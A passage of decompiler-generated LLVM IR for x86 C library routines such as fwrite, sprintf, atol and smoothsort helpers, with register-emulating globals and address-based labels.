  uselistorder label %dec_label_pc_804dace, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804dabb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804daa1, { 1, 0 }
  uselistorder label %dec_label_pc_804da8d, { 1, 0 }
}

define i32 @fwrite(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804dad9 = load i32, i32* @edi, align 4
  %v0_804dada = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v4_804dae3 = trunc i64 %arg2 to i32
  store i32 %v4_804dae3, i32* @edi, align 4
  %v1_804daeb = add i32 %arg4, 76
  %v2_804daeb = inttoptr i32 %v1_804daeb to i32*
  %v3_804daeb = load i32, i32* %v2_804daeb, align 4
  %v4_804daf6 = mul i32 %v4_804dae3, %arg3
  store i32 %v4_804daf6, i32* @ebp, align 4
  %v2_804daf9 = icmp slt i32 %v3_804daeb, 0
  br i1 %v2_804daf9, label %entry.dec_label_pc_804db0d_crit_edge, label %dec_label_pc_804dafd

entry.dec_label_pc_804db0d_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804db0d

dec_label_pc_804dafd:                             ; preds = %entry
  %v1_804db01 = call i32 @__lockfile(i32 %arg4)
  %v0_804db0e.pre = load i32, i32* @esi, align 4
  %phitmp = icmp eq i32 %v1_804db01, 0
  br label %dec_label_pc_804db0d

dec_label_pc_804db0d:                             ; preds = %entry.dec_label_pc_804db0d_crit_edge, %dec_label_pc_804dafd
  %v0_804db0e = phi i32 [ %arg4, %entry.dec_label_pc_804db0d_crit_edge ], [ %v0_804db0e.pre, %dec_label_pc_804dafd ]
  %stack_var_-20.0 = phi i1 [ true, %entry.dec_label_pc_804db0d_crit_edge ], [ %phitmp, %dec_label_pc_804dafd ]
  %v0_804db0d = load i32, i32* @ecx, align 4
  %v3_804db14 = call i32 @__fwritex(i32 %arg1, i32 %v0_804db0e, i32 %v0_804db0d)
  store i32 %v3_804db14, i32* @ebx, align 4
  br i1 %stack_var_-20.0, label %dec_label_pc_804db31, label %dec_label_pc_804db25

dec_label_pc_804db25:                             ; preds = %dec_label_pc_804db0d
  %v0_804db28 = load i32, i32* @esi, align 4
  %v1_804db29 = call i32 @__unlockfile(i32 %v0_804db28)
  %v0_804db31.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804db31

dec_label_pc_804db31:                             ; preds = %dec_label_pc_804db0d, %dec_label_pc_804db25
  %v0_804db35 = phi i32 [ %v3_804db14, %dec_label_pc_804db0d ], [ %v0_804db31.pre, %dec_label_pc_804db25 ]
  %v1_804db31 = load i32, i32* @ebp, align 4
  %v12_804db31 = icmp eq i32 %v0_804db35, %v1_804db31
  br i1 %v12_804db31, label %dec_label_pc_804db3f, label %dec_label_pc_804db35

dec_label_pc_804db35:                             ; preds = %dec_label_pc_804db31
  %v0_804db39 = load i32, i32* @edi, align 4
  %div = udiv i32 %v0_804db35, %v0_804db39
  br label %dec_label_pc_804db3f

dec_label_pc_804db3f:                             ; preds = %dec_label_pc_804db31, %dec_label_pc_804db35
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_804db31 ], [ %div, %dec_label_pc_804db35 ]
  store i32 %v0_804dada, i32* @esi, align 4
  store i32 %v0_804dad9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %v0_804db35, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804db3f, { 1, 0 }
  uselistorder label %dec_label_pc_804db31, { 1, 0 }
  uselistorder label %dec_label_pc_804db0d, { 1, 0 }
}

define i32 @__ofl_unlock() local_unnamed_addr {
entry:
  %v2_804db54 = call i32 @__unlock(i32* nonnull @global_var_8056df4.370)
  ret i32 %v2_804db54

; uselistorder directives
  uselistorder i32 (i32*)* @__unlock, { 2, 0, 1 }
}

define i32 @__ofl_lock(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804db65 = call i32 @__lock(i32* nonnull @global_var_8056df4.370)
  ret i32 ptrtoint (i32* @global_var_8056df0.371 to i32)

; uselistorder directives
  uselistorder i32 (i32*)* @__lock, { 2, 0, 1 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804db77 = ptrtoint i32* %stack_var_12 to i32
  %v3_804db89 = call i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %v2_804db77)
  ret i32 %v3_804db89

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @vsprintf, { 1, 0 }
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804dba8 = call i32 @vsnprintf(i32 %arg1, i32 2147483647, i32 %arg2, i32 %arg3)
  ret i32 %v4_804dba8
}

define i32 @atol(i8* %arg1) local_unnamed_addr {
entry:
  %v4_804dbb5 = ptrtoint i8* %arg1 to i32
  %v4_804dbbc.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804dbbc

dec_label_pc_804dbbb:                             ; preds = %dec_label_pc_804dbc6, %dec_label_pc_804dbbc
  %v1_804dbbb = add i32 %v0_804dbbb, 1
  br label %dec_label_pc_804dbbc

dec_label_pc_804dbbc:                             ; preds = %entry, %dec_label_pc_804dbbb
  %v4_804dbbc = phi i32 [ %v4_804dbbc.pre, %entry ], [ %v6_804dbbc, %dec_label_pc_804dbbb ]
  %v0_804dbbb = phi i32 [ %v4_804dbb5, %entry ], [ %v1_804dbbb, %dec_label_pc_804dbbb ]
  store i32 %v0_804dbbb, i32* @edx, align 4
  %v1_804dbbc = inttoptr i32 %v0_804dbbb to i8*
  %v2_804dbbc = load i8, i8* %v1_804dbbc, align 1
  %v3_804dbbc = zext i8 %v2_804dbbc to i32
  %v5_804dbbc = and i32 %v4_804dbbc, -256
  %v6_804dbbc = or i32 %v3_804dbbc, %v5_804dbbc
  %v6_804dbc1 = icmp eq i8 %v2_804dbbc, 32
  br i1 %v6_804dbc1, label %dec_label_pc_804dbbb, label %dec_label_pc_804dbc6

dec_label_pc_804dbc6:                             ; preds = %dec_label_pc_804dbbc
  %v2_804dbbe = sext i8 %v2_804dbbc to i32
  %v1_804dbc6 = add nsw i32 %v2_804dbbe, -9
  %v5_804dbc9 = icmp ult i32 %v1_804dbc6, 4
  %v9_804dbc9 = icmp eq i8 %v2_804dbbc, 13
  %v2_804dbcc = or i1 %v9_804dbc9, %v5_804dbc9
  br i1 %v2_804dbcc, label %dec_label_pc_804dbbb, label %dec_label_pc_804dbce

dec_label_pc_804dbce:                             ; preds = %dec_label_pc_804dbc6
  %v10_804dbce = icmp eq i8 %v2_804dbbc, 43
  br i1 %v10_804dbce, label %dec_label_pc_804dbe0, label %dec_label_pc_804dbd3

dec_label_pc_804dbd3:                             ; preds = %dec_label_pc_804dbce
  %v10_804dbd5 = icmp eq i8 %v2_804dbbc, 45
  %v1_804dbd8 = icmp eq i1 %v10_804dbd5, false
  br i1 %v1_804dbd8, label %dec_label_pc_804dbe1, label %dec_label_pc_804dbe0

dec_label_pc_804dbe0:                             ; preds = %dec_label_pc_804dbd3, %dec_label_pc_804dbce
  %storemerge2 = phi i32 [ 0, %dec_label_pc_804dbce ], [ 1, %dec_label_pc_804dbd3 ]
  %v1_804dbe0 = add i32 %v0_804dbbb, 1
  store i32 %v1_804dbe0, i32* @edx, align 4
  br label %dec_label_pc_804dbe1

dec_label_pc_804dbe1:                             ; preds = %dec_label_pc_804dbd3, %dec_label_pc_804dbe0
  %v0_804dbf6 = phi i32 [ 0, %dec_label_pc_804dbd3 ], [ %storemerge2, %dec_label_pc_804dbe0 ]
  %v0_804dbeb7 = phi i32 [ %v0_804dbbb, %dec_label_pc_804dbd3 ], [ %v1_804dbe0, %dec_label_pc_804dbe0 ]
  br label %dec_label_pc_804dbeb

dec_label_pc_804dbe5:                             ; preds = %dec_label_pc_804dbeb
  %v3_804dbe5 = mul i32 %v1_804dbe5, 10
  %v1_804dbe8 = add i32 %v0_804dbe8, 1
  store i32 %v1_804dbe8, i32* @edx, align 4
  %v2_804dbe9 = sub i32 %v3_804dbe5, %v1_804dbee
  br label %dec_label_pc_804dbeb

dec_label_pc_804dbeb:                             ; preds = %dec_label_pc_804dbe1, %dec_label_pc_804dbe5
  %v0_804dbe8 = phi i32 [ %v0_804dbeb7, %dec_label_pc_804dbe1 ], [ %v1_804dbe8, %dec_label_pc_804dbe5 ]
  %v1_804dbe5 = phi i32 [ 0, %dec_label_pc_804dbe1 ], [ %v2_804dbe9, %dec_label_pc_804dbe5 ]
  store i32 %v1_804dbe5, i32* @ecx, align 4
  %v1_804dbeb = inttoptr i32 %v0_804dbe8 to i8*
  %v2_804dbeb = load i8, i8* %v1_804dbeb, align 1
  %v3_804dbeb = sext i8 %v2_804dbeb to i32
  %v1_804dbee = add nsw i32 %v3_804dbeb, -48
  %v5_804dbf1 = icmp ult i32 %v1_804dbee, 9
  %v9_804dbf1 = icmp eq i8 %v2_804dbeb, 57
  %v2_804dbf4 = or i1 %v9_804dbf1, %v5_804dbf1
  br i1 %v2_804dbf4, label %dec_label_pc_804dbe5, label %dec_label_pc_804dbf6

dec_label_pc_804dbf6:                             ; preds = %dec_label_pc_804dbeb
  %v1_804dbf6 = icmp eq i32 %v0_804dbf6, 0
  %v1_804dbf8 = icmp eq i1 %v1_804dbf6, false
  br i1 %v1_804dbf8, label %dec_label_pc_804dbfc, label %dec_label_pc_804dbfa

dec_label_pc_804dbfa:                             ; preds = %dec_label_pc_804dbf6
  %v1_804dbfa = sub i32 0, %v1_804dbe5
  store i32 %v1_804dbfa, i32* @ecx, align 4
  br label %dec_label_pc_804dbfc

dec_label_pc_804dbfc:                             ; preds = %dec_label_pc_804dbf6, %dec_label_pc_804dbfa
  %v0_804dbfd = phi i32 [ %v1_804dbe5, %dec_label_pc_804dbf6 ], [ %v1_804dbfa, %dec_label_pc_804dbfa ]
  ret i32 %v0_804dbfd

; uselistorder directives
  uselistorder i32 %v1_804dbee, { 1, 0 }
  uselistorder i32 %v1_804dbe5, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804dbe8, { 1, 0 }
  uselistorder i8 %v2_804dbbc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_804dbbb, { 0, 1, 3, 4, 2 }
  uselistorder i8 13, { 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 0, 1, 2 }
  uselistorder label %dec_label_pc_804dbfc, { 1, 0 }
  uselistorder label %dec_label_pc_804dbeb, { 1, 0 }
  uselistorder label %dec_label_pc_804dbe1, { 1, 0 }
  uselistorder label %dec_label_pc_804dbbc, { 1, 0 }
}

define i32 @pntz(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804dc00 = load i32, i32* @eax, align 4
  %v1_804dc02 = inttoptr i32 %v0_804dc00 to i32*
  %v2_804dc02 = load i32, i32* %v1_804dc02, align 4
  %v1_804dc04 = add i32 %v2_804dc02, -1
  %v8_804dc04 = icmp eq i32 %v1_804dc04, 0
  %v2_804dc05 = call i32 @llvm.cttz.i32(i32 %v1_804dc04, i1 true)
  %v4_804dc05 = select i1 %v8_804dc04, i32 0, i32 %v2_804dc05
  %v1_804dc08 = icmp eq i32 %v4_804dc05, 0
  %v1_804dc0a = icmp eq i1 %v1_804dc08, false
  br i1 %v1_804dc0a, label %dec_label_pc_804dc1e, label %dec_label_pc_804dc0c

dec_label_pc_804dc0c:                             ; preds = %entry
  %v1_804dc0c = add i32 %v0_804dc00, 4
  %v2_804dc0c = inttoptr i32 %v1_804dc0c to i32*
  %v3_804dc0c = load i32, i32* %v2_804dc0c, align 4
  %v2_804dc0f = call i32 @llvm.cttz.i32(i32 %v3_804dc0c, i1 true)
  %v3_804dc0f = icmp eq i32 %v3_804dc0c, 0
  %v2_804dc0f.op = or i32 %v2_804dc0f, 32
  %v1_804dc12 = select i1 %v3_804dc0f, i32 32, i32 %v2_804dc0f.op
  %v6_804dc17 = icmp eq i32 %v1_804dc12, 32
  br i1 %v6_804dc17, label %dec_label_pc_804dc1e, label %dec_label_pc_804dc1c

dec_label_pc_804dc1c:                             ; preds = %dec_label_pc_804dc0c
  br label %dec_label_pc_804dc1e

dec_label_pc_804dc1e:                             ; preds = %dec_label_pc_804dc0c, %entry, %dec_label_pc_804dc1c
  %v0_804dc1e = phi i32 [ 0, %dec_label_pc_804dc0c ], [ %v4_804dc05, %entry ], [ %v1_804dc12, %dec_label_pc_804dc1c ]
  ret i32 %v0_804dc1e

; uselistorder directives
  uselistorder i32 %v1_804dc12, { 1, 0 }
  uselistorder i32 %v3_804dc0c, { 1, 0 }
  uselistorder label %dec_label_pc_804dc1e, { 2, 0, 1 }
}

define i32 @shl() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804dc20 = load i32, i32* @edx, align 4
  store i32 %v0_804dc20, i32* %edi.global-to-local, align 4
  %v0_804dc26 = load i32, i32* @ebx, align 4
  store i32 %v0_804dc26, i32* %stack_var_-12, align 4
  %v0_804dc27 = load i32, i32* @eax, align 4
  store i32 %v0_804dc27, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804dc20, 32
  br i1 %tmp, label %dec_label_pc_804dc39, label %dec_label_pc_804dc2b

dec_label_pc_804dc2b:                             ; preds = %entry
  %v1_804dc2b = inttoptr i32 %v0_804dc27 to i32*
  %v2_804dc2b = load i32, i32* %v1_804dc2b, align 4
  store i32 %v2_804dc2b, i32* %eax.global-to-local, align 4
  %v1_804dc2d = add i32 %v0_804dc20, -32
  store i32 %v1_804dc2d, i32* %edi.global-to-local, align 4
  store i32 0, i32* %v1_804dc2b, align 4
  %v0_804dc36 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc36 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804dc36 = add i32 %v1_804dc36, 4
  %v3_804dc36 = inttoptr i32 %v2_804dc36 to i32*
  store i32 %v0_804dc36, i32* %v3_804dc36, align 4
  %v0_804dc39.pre = load i32, i32* %ebx.global-to-local, align 4
  %v0_804dc41.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc39

dec_label_pc_804dc39:                             ; preds = %entry, %dec_label_pc_804dc2b
  %v0_804dc4d = phi i32 [ %v0_804dc20, %entry ], [ %v0_804dc41.pre, %dec_label_pc_804dc2b ]
  %v14_804dc51 = phi i32 [ %v0_804dc27, %entry ], [ %v0_804dc39.pre, %dec_label_pc_804dc2b ]
  %v1_804dc39 = add i32 %v14_804dc51, 4
  %v2_804dc39 = inttoptr i32 %v1_804dc39 to i32*
  %v3_804dc39 = load i32, i32* %v2_804dc39, align 4
  store i32 %v3_804dc39, i32* @edx, align 4
  %v1_804dc43 = inttoptr i32 %v14_804dc51 to i32*
  %v2_804dc43 = load i32, i32* %v1_804dc43, align 4
  store i32 %v2_804dc43, i32* %eax.global-to-local, align 4
  %v2_804dc45 = sub i32 32, %v0_804dc4d
  %v2_804dc47 = urem i32 %v0_804dc4d, 32
  %v4_804dc47 = icmp eq i32 %v2_804dc47, 0
  br i1 %v4_804dc47, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_804dc39
  %v5_804dc47 = shl i32 %v3_804dc39, %v2_804dc47
  store i32 %v5_804dc47, i32* @edx, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_804dc39, %bb
  %v1_804dc4f = phi i32 [ %v3_804dc39, %dec_label_pc_804dc39 ], [ %v5_804dc47, %bb ]
  %v2_804dc4b = urem i32 %v2_804dc45, 32
  %v4_804dc4b = icmp eq i32 %v2_804dc4b, 0
  br i1 %v4_804dc4b, label %bb12, label %bb11

bb11:                                             ; preds = %bb10
  %v5_804dc4b = lshr i32 %v2_804dc43, %v2_804dc4b
  store i32 %v5_804dc4b, i32* %eax.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v0_804dc4f = phi i32 [ %v2_804dc43, %bb10 ], [ %v5_804dc4b, %bb11 ]
  store i32 %v0_804dc4d, i32* @ecx, align 4
  %v2_804dc4f = or i32 %v0_804dc4f, %v1_804dc4f
  store i32 %v2_804dc4f, i32* %eax.global-to-local, align 4
  br i1 %v4_804dc47, label %bb14, label %bb13

bb13:                                             ; preds = %bb12
  %v2_804dc51 = load i32, i32* %v1_804dc43, align 4
  %v7_804dc51 = shl i32 %v2_804dc51, %v2_804dc47
  store i32 %v7_804dc51, i32* %v1_804dc43, align 4
  %v1_804dc53.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %bb14

bb14:                                             ; preds = %bb12, %bb13
  %v1_804dc53 = phi i32 [ %v14_804dc51, %bb12 ], [ %v1_804dc53.pre, %bb13 ]
  %v2_804dc53 = add i32 %v1_804dc53, 4
  %v3_804dc53 = inttoptr i32 %v2_804dc53 to i32*
  store i32 %v2_804dc4f, i32* %v3_804dc53, align 4
  %v2_804dc56 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc56, i32* @ebx, align 4
  ret i32 %v2_804dc4f

; uselistorder directives
  uselistorder i32 %v2_804dc4b, { 1, 0 }
  uselistorder i32 %v2_804dc47, { 2, 1, 0 }
  uselistorder i32 %v0_804dc4d, { 1, 0, 2 }
  uselistorder i32 %v0_804dc20, { 1, 2, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_804dc39, { 1, 0 }
}

define i32 @shr(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804dc5b = load i32, i32* @edx, align 4
  store i32 %v0_804dc5b, i32* %edi.global-to-local, align 4
  %v0_804dc61 = load i32, i32* @ebx, align 4
  store i32 %v0_804dc61, i32* %stack_var_-12, align 4
  %v0_804dc62 = load i32, i32* @eax, align 4
  store i32 %v0_804dc62, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804dc5b, 32
  br i1 %tmp, label %dec_label_pc_804dc75, label %dec_label_pc_804dc66

dec_label_pc_804dc66:                             ; preds = %entry
  %v1_804dc66 = add i32 %v0_804dc62, 4
  %v2_804dc66 = inttoptr i32 %v1_804dc66 to i32*
  %v3_804dc66 = load i32, i32* %v2_804dc66, align 4
  store i32 %v3_804dc66, i32* %eax.global-to-local, align 4
  %v1_804dc69 = add i32 %v0_804dc5b, -32
  store i32 %v1_804dc69, i32* %edi.global-to-local, align 4
  store i32 0, i32* %v2_804dc66, align 4
  %v0_804dc73 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc73 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804dc73 = inttoptr i32 %v1_804dc73 to i32*
  store i32 %v0_804dc73, i32* %v2_804dc73, align 4
  %v0_804dc75.pre = load i32, i32* %ebx.global-to-local, align 4
  %v0_804dc7c.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc75

dec_label_pc_804dc75:                             ; preds = %entry, %dec_label_pc_804dc66
  %v0_804dc89 = phi i32 [ %v0_804dc5b, %entry ], [ %v0_804dc7c.pre, %dec_label_pc_804dc66 ]
  %v15_804dc8d = phi i32 [ %v0_804dc62, %entry ], [ %v0_804dc75.pre, %dec_label_pc_804dc66 ]
  %v1_804dc75 = inttoptr i32 %v15_804dc8d to i32*
  %v2_804dc75 = load i32, i32* %v1_804dc75, align 4
  store i32 %v2_804dc75, i32* @edx, align 4
  %v1_804dc7e = add i32 %v15_804dc8d, 4
  %v2_804dc7e = inttoptr i32 %v1_804dc7e to i32*
  %v3_804dc7e = load i32, i32* %v2_804dc7e, align 4
  store i32 %v3_804dc7e, i32* %eax.global-to-local, align 4
  %v2_804dc81 = sub i32 32, %v0_804dc89
  %v2_804dc83 = urem i32 %v0_804dc89, 32
  %v4_804dc83 = icmp eq i32 %v2_804dc83, 0
  br i1 %v4_804dc83, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_804dc75
  %v5_804dc83 = lshr i32 %v2_804dc75, %v2_804dc83
  store i32 %v5_804dc83, i32* @edx, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_804dc75, %bb
  %v1_804dc8b = phi i32 [ %v2_804dc75, %dec_label_pc_804dc75 ], [ %v5_804dc83, %bb ]
  %v2_804dc87 = urem i32 %v2_804dc81, 32
  %v4_804dc87 = icmp eq i32 %v2_804dc87, 0
  br i1 %v4_804dc87, label %bb12, label %bb11

bb11:                                             ; preds = %bb10
  %v5_804dc87 = shl i32 %v3_804dc7e, %v2_804dc87
  store i32 %v5_804dc87, i32* %eax.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v0_804dc8b = phi i32 [ %v3_804dc7e, %bb10 ], [ %v5_804dc87, %bb11 ]
  store i32 %v0_804dc89, i32* @ecx, align 4
  %v2_804dc8b = or i32 %v0_804dc8b, %v1_804dc8b
  store i32 %v2_804dc8b, i32* %eax.global-to-local, align 4
  br i1 %v4_804dc83, label %bb14, label %bb13

bb13:                                             ; preds = %bb12
  %v3_804dc8d = load i32, i32* %v2_804dc7e, align 4
  %v8_804dc8d = lshr i32 %v3_804dc8d, %v2_804dc83
  store i32 %v8_804dc8d, i32* %v2_804dc7e, align 4
  %v1_804dc90.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %bb14

bb14:                                             ; preds = %bb12, %bb13
  %v1_804dc90 = phi i32 [ %v15_804dc8d, %bb12 ], [ %v1_804dc90.pre, %bb13 ]
  %v2_804dc90 = inttoptr i32 %v1_804dc90 to i32*
  store i32 %v2_804dc8b, i32* %v2_804dc90, align 4
  %v2_804dc92 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc92, i32* @ebx, align 4
  ret i32 %v2_804dc8b

; uselistorder directives
  uselistorder i32 %v2_804dc87, { 1, 0 }
  uselistorder i32 %v2_804dc83, { 2, 1, 0 }
  uselistorder i32 %v0_804dc89, { 1, 0, 2 }
  uselistorder i32 %v0_804dc5b, { 1, 2, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_804dc75, { 1, 0 }
}

define i32 @cycle() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %v0_804dc97 = load i32, i32* @eax, align 4
  store i32 %v0_804dc97, i32* %ebp.global-to-local, align 4
  %v0_804dc9a = load i32, i32* @edx, align 4
  store i32 %v0_804dc9a, i32* @edi, align 4
  %v0_804dc9c = load i32, i32* @esi, align 4
  %v0_804dca4 = load i32, i32* @ecx, align 4
  %v7_804dcab = icmp sgt i32 %v0_804dca4, 1
  br i1 %v7_804dcab, label %dec_label_pc_804dcad, label %dec_label_pc_804dd04

dec_label_pc_804dcad:                             ; preds = %entry
  %v2_804dcad = mul i32 %v0_804dca4, 4
  %v3_804dcad = add i32 %v2_804dcad, %v0_804dc9a
  %v2_804dcb8 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804dcb8, i32* %eax.global-to-local, align 4
  %v2_804dcbc = inttoptr i32 %v3_804dcad to i32*
  store i32 %v2_804dcb8, i32* %v2_804dcbc, align 4
  %v0_804dd001 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804dd002 = icmp eq i32 %v0_804dd001, 0
  %v1_804dd029 = icmp eq i1 %v1_804dd002, false
  br i1 %v1_804dd029, label %dec_label_pc_804dcc0.lr.ph, label %dec_label_pc_804dd04.loopexit

dec_label_pc_804dcc0.lr.ph:                       ; preds = %dec_label_pc_804dcad
  br label %dec_label_pc_804dcc0

dec_label_pc_804dcc0:                             ; preds = %dec_label_pc_804dcc0.lr.ph, %dec_label_pc_804dcfe
  %v0_804dcc6 = phi i32 [ %v0_804dd001, %dec_label_pc_804dcc0.lr.ph ], [ %v2_804dcfe, %dec_label_pc_804dcfe ]
  %tmp31 = icmp ugt i32 %v0_804dcc6, 256
  %v0_804dcc6. = select i1 %tmp31, i32 256, i32 %v0_804dcc6
  store i32 %v0_804dcc6., i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804dcd3 = load i32, i32* @edi, align 4
  %v1_804dcd3 = inttoptr i32 %v0_804dcd3 to i32*
  %v2_804dcd3 = load i32, i32* %v1_804dcd3, align 4
  store i32 %v3_804dcad, i32* %eax.global-to-local, align 4
  %v2_804dcd9 = load i32, i32* %v2_804dcbc, align 4
  %v3_804dcdb = inttoptr i32 %v2_804dcd9 to i8*
  %v4_804dcdb = call i32 @memcpy(i8* %v3_804dcdb, i32 %v2_804dcd3, i32 %v0_804dcc6.)
  store i32 %v4_804dcdb, i32* %eax.global-to-local, align 4
  %v1_804dce5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dce3

dec_label_pc_804dce3:                             ; preds = %dec_label_pc_804dce3, %dec_label_pc_804dcc0
  %v1_804dce9 = phi i32 [ %v1_804dce5.pre, %dec_label_pc_804dcc0 ], [ %v1_804dcf7, %dec_label_pc_804dce3 ]
  %v0_804dce4 = load i32, i32* @esi, align 4
  %v0_804dce5 = load i32, i32* @edi, align 4
  %v2_804dce5 = mul i32 %v1_804dce9, 4
  %v3_804dce5 = add i32 %v2_804dce5, 4
  %v4_804dce5 = add i32 %v3_804dce5, %v0_804dce5
  %v5_804dce5 = inttoptr i32 %v4_804dce5 to i32*
  %v6_804dce5 = load i32, i32* %v5_804dce5, align 4
  %v3_804dce9 = add i32 %v0_804dce5, %v2_804dce5
  %v4_804dce9 = inttoptr i32 %v3_804dce9 to i32*
  %v5_804dce9 = load i32, i32* %v4_804dce9, align 4
  %v3_804dcec = inttoptr i32 %v5_804dce9 to i8*
  %v4_804dcec = call i32 @memcpy(i8* %v3_804dcec, i32 %v6_804dce5, i32 %v0_804dce4)
  store i32 %v4_804dcec, i32* %eax.global-to-local, align 4
  %v0_804dcf4 = load i32, i32* @edi, align 4
  %v1_804dcf4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804dcf4 = mul i32 %v1_804dcf4, 4
  %v3_804dcf4 = add i32 %v2_804dcf4, %v0_804dcf4
  %v4_804dcf4 = inttoptr i32 %v3_804dcf4 to i32*
  %v5_804dcf4 = load i32, i32* %v4_804dcf4, align 4
  %v6_804dcf4 = load i32, i32* @esi, align 4
  %v7_804dcf4 = add i32 %v6_804dcf4, %v5_804dcf4
  store i32 %v7_804dcf4, i32* %v4_804dcf4, align 4
  %v0_804dcf7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dcf7 = add i32 %v0_804dcf7, 1
  store i32 %v1_804dcf7, i32* %ebx.global-to-local, align 4
  %v15_804dcf8 = icmp eq i32 %v1_804dcf7, %v0_804dca4
  %v1_804dcfc = icmp eq i1 %v15_804dcf8, false
  br i1 %v1_804dcfc, label %dec_label_pc_804dce3, label %dec_label_pc_804dcfe

dec_label_pc_804dcfe:                             ; preds = %dec_label_pc_804dce3
  %v0_804dcfe = load i32, i32* %ebp.global-to-local, align 4
  %v1_804dcfe = load i32, i32* @esi, align 4
  %v2_804dcfe = sub i32 %v0_804dcfe, %v1_804dcfe
  %v12_804dcfe = icmp eq i32 %v2_804dcfe, 0
  store i32 %v2_804dcfe, i32* %ebp.global-to-local, align 4
  %v1_804dd02 = icmp eq i1 %v12_804dcfe, false
  br i1 %v1_804dd02, label %dec_label_pc_804dcc0, label %dec_label_pc_804dd04.loopexit

dec_label_pc_804dd04.loopexit:                    ; preds = %dec_label_pc_804dcfe, %dec_label_pc_804dcad
  %v0_804dd0e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dd04

dec_label_pc_804dd04:                             ; preds = %dec_label_pc_804dd04.loopexit, %entry
  %v0_804dd0e = phi i32 [ %v0_804dd0e.pre, %dec_label_pc_804dd04.loopexit ], [ %v0_804dc97, %entry ]
  store i32 %v0_804dc9c, i32* @esi, align 4
  ret i32 %v0_804dd0e

; uselistorder directives
  uselistorder i32 %v2_804dcfe, { 1, 2, 0 }
  uselistorder i32 %v1_804dcf7, { 0, 2, 1 }
  uselistorder i32 %v0_804dce5, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804dcc0, { 1, 0 }
}

define i32 @sift(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp19, i32* %stack_var_-272, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dd10 = load i32, i32* @ecx, align 4
  %v0_804dd13 = load i32, i32* @esi, align 4
  %v0_804dd14 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd14, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @edi, align 4
